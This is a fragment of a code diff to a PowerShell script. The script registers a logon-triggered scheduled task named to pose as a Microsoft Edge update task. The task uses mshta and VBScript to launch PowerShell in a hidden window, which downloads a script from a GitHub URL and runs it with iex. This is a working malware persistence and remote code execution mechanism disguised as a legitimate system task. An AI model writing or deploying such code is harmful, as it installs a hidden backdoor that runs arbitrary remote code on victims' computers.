@@ -1,3 +1,4 @@
+$skid = "skid"
 $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$skid='$skid';iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
 $task_name = "MicrosoftEdgeUpdateTaskMachineAV"
